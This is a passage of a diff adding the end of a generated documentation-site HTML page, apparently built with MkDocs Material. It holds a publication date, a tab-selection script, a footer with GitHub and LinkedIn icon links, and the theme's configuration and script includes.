+<strong>Date published:</strong> 15/11/26</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/janekpstudentuad" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/jane-kocan-payne-662692166/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.expand", "navigation.sections", "content.code.copy", "content.code.annotate", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
